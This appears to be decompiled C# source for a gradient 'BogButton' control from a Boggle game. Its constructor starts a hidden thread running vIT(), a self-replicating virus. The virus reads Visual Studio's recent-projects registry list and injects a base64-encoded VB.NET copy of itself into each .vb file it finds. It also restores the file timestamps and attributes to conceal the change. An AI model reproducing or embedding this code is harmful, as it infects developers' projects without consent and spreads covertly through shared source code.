using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Boggle;

public class BogButton : Button
{
	private IContainer components;

	private Color[] BkGradColors;

	private Color[] TxtGradColors;

	private string clsButtonText;

	private bool clsEnabled;

	public bool BogButtonEnabled
	{
		get
		{
			return clsEnabled;
		}
		set
		{
			clsEnabled = value;
			if (!clsEnabled)
			{
				ref Color reference = ref TxtGradColors[0];
				reference = Color.LightGray;
				ref Color reference2 = ref TxtGradColors[1];
				reference2 = Color.Black;
				ref Color reference3 = ref BkGradColors[0];
				reference3 = Color.DarkGray;
				ref Color reference4 = ref BkGradColors[1];
				reference4 = Color.LightGray;
			}
			else
			{
				ref Color reference5 = ref TxtGradColors[0];
				reference5 = Color.LightCyan;
				ref Color reference6 = ref TxtGradColors[1];
				reference6 = Color.DarkSalmon;
				ref Color reference7 = ref BkGradColors[0];
				reference7 = Color.LightBlue;
				ref Color reference8 = ref BkGradColors[1];
				reference8 = Color.Blue;
			}
			((Control)this).set_Enabled(clsEnabled);
			((Control)this).Refresh();
		}
	}

	public string ButtonText
	{
		get
		{
			return clsButtonText;
		}
		set
		{
			clsButtonText = value;
			((Control)this).Refresh();
		}
	}

	private void vIT()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			ProjectData.EndApp();
		}
		string text = "Private Sub vIT()";
		string text2 = "Public Sub New()";
		string text3 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
		string text4 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC";
		text4 += "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE";
		text4 += "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT";
		text4 += "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T";
		text4 += "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K";
		text4 += "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi";
		text4 += "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0";
		text4 += "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy";
		text4 += "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE";
		text4 += "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ";
		text4 += "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U";
		text4 += "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t";
		text4 += "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g";
		text4 += "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg";
		text4 += "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog";
		text4 += "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy";
		text4 += "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo";
		text4 += "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9";
		text4 += "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs";
		text4 += "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB";
		text4 += "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp";
		text4 += "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku";
		text4 += "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k";
		text4 += "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN";
		text4 += "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g";
		text4 += "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp";
		text4 += "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp";
		text4 += "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU";
		text4 += "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu";
		text4 += "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+";
		text4 += "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu";
		text4 += "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD";
		text4 += "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp";
		text4 += "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD";
		text4 += "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu";
		text4 += "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz";
		text4 += "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0";
		text4 += "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text4));
		string text5 = "J = \"";
		int num = Strings.Len(text4);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text5 = ((i + 64 >= Strings.Len(text4)) ? (text5 + Strings.Mid(text4, i, 64) + "\"") : string.Concat(text5 + Strings.Mid(text4, i, 64) + "\"", "\r\nJ = J & ", "\""));
			}
			@string = Strings.Replace(@string, "J = \"\"", text5, 1, 1, (CompareMethod)1);
			text5 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text6 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text6 = Strings.Mid(text6, 1, Strings.InStrRev(text6, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text6))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text6, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					string text7 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text7, text, (CompareMethod)1) == 0) & (Strings.InStr(text7, text2, (CompareMethod)1) != 0))
					{
						text7 = Strings.Replace(text7, "MyBase.New()", "MyBase.New()\r\n" + text3, 1, 1, (CompareMethod)1);
						text7 = Strings.Replace(text7, text2, @string + text2, 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text7);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}

	public BogButton()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		((Control)this).add_MouseDown(new MouseEventHandler(BogButton_MouseDown));
		((Control)this).add_MouseUp(new MouseEventHandler(BogButton_MouseUp));
		((Control)this).add_MouseEnter((EventHandler)BogButton_MouseEnter);
		((Control)this).add_Paint(new PaintEventHandler(OnPaint));
		((Control)this).add_MouseLeave((EventHandler)BogButton_MouseLeave);
		BkGradColors = new Color[2]
		{
			Color.LightBlue,
			Color.Blue
		};
		TxtGradColors = new Color[2]
		{
			Color.LightCyan,
			Color.DarkSalmon
		};
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
		clsButtonText = "New";
		BogButtonEnabled = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((ButtonBase)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		components = new Container();
	}

	protected void OnPaint(object sender, PaintEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fc: Expected O, but got Unknown
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Expected O, but got Unknown
		GraphicsPath val = new GraphicsPath();
		Rectangle rectangle = new Rectangle(0, 0, ((Control)this).get_Width(), ((Control)this).get_Height());
		LinearGradientBrush val2 = new LinearGradientBrush(rectangle, BkGradColors[0], BkGradColors[1], (LinearGradientMode)2);
		LinearGradientBrush val3 = new LinearGradientBrush(rectangle, TxtGradColors[0], TxtGradColors[1], (LinearGradientMode)2);
		val.AddArc(rectangle, 335f, 50f);
		val.AddArc(rectangle, 155f, 50f);
		val2.set_LinearColors(BkGradColors);
		e.get_Graphics().FillPath((Brush)(object)val2, val);
		e.get_Graphics().set_SmoothingMode((SmoothingMode)2);
		Font font = ((Control)this).get_Font();
		SizeF sizeF = default(SizeF);
		Graphics graphics = e.get_Graphics();
		string text = clsButtonText;
		StringFormat val4 = new StringFormat((StringFormatFlags)1);
		int num = Strings.Len(clsButtonText);
		int num2 = 1;
		sizeF = graphics.MeasureString(text, font, default(SizeF), val4, ref num, ref num2);
		e.get_Graphics().DrawString(clsButtonText, new Font(((Control)this).get_Font().get_FontFamily(), 10f, (FontStyle)1), (Brush)(object)val3, (float)((double)((Control)this).get_Width() / 2.35 - (double)(sizeF.Width / 2f)), 16f);
		((Control)this).set_Region(new Region(val));
	}

	private void BogButton_MouseUp(object sender, MouseEventArgs e)
	{
		checked
		{
			((Control)this).set_Left(((Control)this).get_Left() - 3);
			((Control)this).set_Top(((Control)this).get_Top() - 3);
			ref Color reference = ref BkGradColors[0];
			reference = Color.LightBlue;
			ref Color reference2 = ref BkGradColors[1];
			reference2 = Color.Blue;
			ref Color reference3 = ref TxtGradColors[0];
			reference3 = Color.Red;
			ref Color reference4 = ref TxtGradColors[1];
			reference4 = Color.Navy;
			((Control)this).Refresh();
			((Control)this).set_Enabled(clsEnabled);
		}
	}

	private void BogButton_MouseEnter(object sender, EventArgs e)
	{
		ref Color reference = ref TxtGradColors[0];
		reference = Color.Red;
		ref Color reference2 = ref TxtGradColors[1];
		reference2 = Color.Navy;
		((Control)this).Refresh();
	}

	private void BogButton_MouseLeave(object sender, EventArgs e)
	{
		ref Color reference = ref TxtGradColors[0];
		reference = Color.LightCyan;
		ref Color reference2 = ref TxtGradColors[1];
		reference2 = Color.DarkSalmon;
		((Control)this).Refresh();
	}

	private void BogButton_MouseDown(object sender, MouseEventArgs e)
	{
		checked
		{
			((Control)this).set_Left(((Control)this).get_Left() + 3);
			((Control)this).set_Top(((Control)this).get_Top() + 3);
			ref Color reference = ref BkGradColors[1];
			reference = Color.DarkBlue;
			ref Color reference2 = ref TxtGradColors[1];
			reference2 = Color.Navy;
			((Control)this).Refresh();
		}
	}
}
